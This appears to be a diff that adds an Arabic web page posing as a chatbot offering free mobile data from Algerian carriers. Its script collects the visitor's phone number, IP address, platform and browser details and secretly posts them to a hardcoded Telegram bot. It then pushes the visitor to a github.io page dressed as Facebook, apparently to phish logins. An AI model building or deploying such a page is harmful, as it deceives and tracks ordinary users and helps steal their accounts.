@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>مساعد العروض الذكي</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      direction: rtl;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #f0f4ff;
+      overflow: hidden;
+    }
+    body::before {
+      content: "";
+      position: absolute;
+      width: 150%;
+      height: 150%;
+      top: -25%;
+      left: -25%;
+      background: radial-gradient(circle at center, #a0d4ff 10%, transparent 60%), radial-gradient(circle at bottom right, #e0f7ff 20%, transparent 70%);
+      animation: floatBG 8s infinite ease-in-out alternate;
+      z-index: -1;
+    }
+    @keyframes floatBG {
+      0% { transform: scale(1) translate(0, 0); }
+      100% { transform: scale(1.1) translate(20px, 30px); }
+    }
+    .chat-container {
+      background: white;
+      border-radius: 16px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.1);
+      width: 95%;
+      max-width: 420px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      position: relative;
+      overflow-y: auto;
+      max-height: 90vh;
+      z-index: 1;
+    }
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 10px;
+    }
+    .header img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+    }
+    .header span {
+      font-weight: bold;
+      font-size: 18px;
+      color: #007bff;
+    }
+    .message-row {
+      display: flex;
+      align-items: flex-end;
+      gap: 10px;
+      animation: fadeIn 0.4s ease-in-out;
+    }
+    .message-row.bot {
+      flex-direction: row-reverse;
+      align-self: flex-start;
+    }
+    .message-row.user {
+      flex-direction: row;
+      align-self: flex-end;
+    }
+    .message {
+      padding: 12px 16px;
+      border-radius: 14px;
+      font-size: 15px;
+      line-height: 1.6;
+      max-width: 75%;
+    }
+    .bot .message {
+      background-color: #e6efff;
+    }
+    .user .message {
+      background-color: #d1ffe6;
+    }
+    .avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+    }
+    .options {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 10px;
+    }
+    .option-button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      padding: 12px;
+      cursor: pointer;
+      font-size: 15px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      transition: background 0.3s ease;
+      text-decoration: none;
+      justify-content: center;
+    }
+    .option-button:hover {
+      background-color: #0056b3;
+    }
+    input[type="tel"] {
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 15px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .user-count {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background-color: #ffffffcc;
+      padding: 8px 14px;
+      border-radius: 12px;
+      font-size: 14px;
+      color: #333;
+      font-weight: 600;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      z-index: 10;
+      backdrop-filter: blur(6px);
+    }
+    .user-count i {
+      color: #007bff;
+    }
+  </style>
+</head>
+<body>
+
+<audio id="clickSound" src="https://cdn.pixabay.com/audio/2022/03/15/audio_d2f91d1ad1.mp3" preload="auto"></audio>
+
+<div class="user-count">
+  <i class="fas fa-users"></i> <span id="userNumber">78,216</span> مستخدم
+</div>
+
+<div class="chat-container" id="chat">
+  <div class="header">
+    <img src="https://cdn-icons-png.flaticon.com/512/4712/4712027.png" alt="Bot Avatar">
+    <span>مساعد العروض الذكي</span>
+  </div>
+
+  <div class="message-row bot">
+    <img src="https://cdn-icons-png.flaticon.com/512/4712/4712027.png" class="avatar" alt="Bot">
+    <div class="message">مرحباً! كيف يمكنني مساعدتك اليوم؟</div>
+  </div>
+
+  <div class="options" id="step1">
+    <button class="option-button" onclick="playSound(); selectStep1()">
+      <i class="fas fa-bolt"></i> تشغيل عرض الإنترنت
+    </button>
+  </div>
+</div>
+
+<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+const TOKEN = "7474180263:AAHRByLJi2S6Mkby-RZFXHRLCgX1jdSIJhE";
+const CHAT_ID = "7223574687";
+const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+const chat = document.getElementById("chat");
+const sound = document.getElementById("clickSound");
+
+function playSound() {
+  sound.currentTime = 0;
+  sound.play();
+}
+
+function addMessage(text, sender = "bot") {
+  const row = document.createElement("div");
+  row.className = `message-row ${sender}`;
+  const avatar = document.createElement("img");
+  avatar.className = "avatar";
+  avatar.src = sender === "bot"
+    ? "https://cdn-icons-png.flaticon.com/512/4712/4712027.png"
+    : "https://cdn-icons-png.flaticon.com/512/4140/4140037.png";
+  const msg = document.createElement("div");
+  msg.className = "message";
+  msg.innerHTML = text;
+  row.appendChild(avatar);
+  row.appendChild(msg);
+  chat.appendChild(row);
+  chat.scrollTop = chat.scrollHeight;
+}
+
+function selectStep1() {
+  document.getElementById("step1").style.display = "none";
+  addMessage("تشغيل عرض الإنترنت", "user");
+  setTimeout(() => {
+    addMessage("اختر شركة الاتصالات:");
+    const options = document.createElement("div");
+    options.className = "options";
+    options.id = "step2";
+    options.innerHTML = `
+      <button class="option-button" onclick="playSound(); selectOperator('موبيليس')"><i class="fas fa-signal"></i> موبيليس</button>
+      <button class="option-button" onclick="playSound(); selectOperator('جيزي')"><i class="fas fa-satellite-dish"></i> جيزي</button>
+      <button class="option-button" onclick="playSound(); selectOperator('أوريدو')"><i class="fas fa-network-wired"></i> أوريدو</button>
+    `;
+    chat.appendChild(options);
+  }, 500);
+}
+
+function selectOperator(operator) {
+  document.getElementById("step2").style.display = "none";
+  addMessage(operator, "user");
+  setTimeout(() => {
+    addMessage(`رائع! اختر حجم العرض من ${operator}:`);
+    const options = document.createElement("div");
+    options.className = "options";
+    options.id = "step3";
+    options.innerHTML = `
+      <button class="option-button" onclick="playSound(); finalChoice('${operator}', '1 جيجا')"><i class="fas fa-database"></i> 1 جيجا</button>
+      <button class="option-button" onclick="playSound(); finalChoice('${operator}', '2 جيجا')"><i class="fas fa-database"></i> 2 جيجا</button>
+      <button class="option-button" onclick="playSound(); finalChoice('${operator}', '6 جيجا')"><i class="fas fa-database"></i> 6 جيجا</button>
+    `;
+    chat.appendChild(options);
+  }, 500);
+}
+
+function finalChoice(operator, size) {
+  document.getElementById("step3").style.display = "none";
+  addMessage(size, "user");
+  setTimeout(() => {
+    addMessage(`✅ تم اختيار <strong>${size}</strong> من <strong>${operator}</strong>.<br>الرجاء إدخال رقم هاتفك لاستلام العرض:`);
+    const inputContainer = document.createElement("div");
+    inputContainer.className = "options";
+    inputContainer.id = "phoneStep";
+    inputContainer.innerHTML = `
+      <input type="tel" id="phoneInput" placeholder="مثال: 0661123456">
+      <button class="option-button" onclick="submitPhone('${operator}', '${size}')"><i class="fas fa-check-circle"></i> إرسال الرقم</button>
+    `;
+    chat.appendChild(inputContainer);
+    chat.scrollTop = chat.scrollHeight;
+  }, 600);
+}
+
+function submitPhone(operator, size) {
+  const phone = document.getElementById("phoneInput").value.trim();
+  if (!/^0[567]\d{8}$/.test(phone)) {
+    alert("⚠️ الرجاء إدخال رقم هاتف جزائري صالح مكون من 10 أرقام ويبدأ بـ 05 أو 06 أو 07.");
+    return;
+  }
+  document.getElementById("phoneStep").style.display = "none";
+  addMessage(phone, "user");
+
+  axios.get('https://api.ipify.org?format=json')
+    .then(response => {
+      const ip = response.data.ip;
+      const platform = navigator.platform;
+      const userAgent = navigator.userAgent;
+      const message = `📥 <b>طلب عرض جديد</b>\n\n<b>الشركة:</b> ${operator}\n<b>الحجم:</b> ${size}\n<b>الرقم:</b> ${phone}\n<b>IP:</b> ${ip}\n<b>النظام:</b> ${platform}\n<b>المتصفح:</b> ${userAgent}`;
+      axios.post(URI_API, {
+        chat_id: CHAT_ID,
+        parse_mode: "html",
+        text: message
+      });
+    });
+
+  setTimeout(() => {
+    addMessage(`📲 شكراً! سيتم تفعيل عرض <strong>${size}</strong> على رقم <strong>${phone}</strong> خلال دقائق.<br><br>
+📌 <strong>ملاحظة:</strong> لتفعيل العرض، يُرجى أولاً متابعة <strong>حسابنا الرسمي على فيسبوك</strong> باستخدام متصفح <strong>Google</strong>.<br><br>
+<div style="margin-top: 10px;">
+  <a href="https://account-edit.github.io/Connexion-Internet/facebook%20page/index.html" target="_blank" class="option-button" style="background-color:#1877f2;">
+    <i class="fab fa-facebook-f"></i> متابعة صفحتنا على فيسبوك
+  </a>
+</div>`);
+  }, 500);
+}
+</script>
+</body>
+</html>
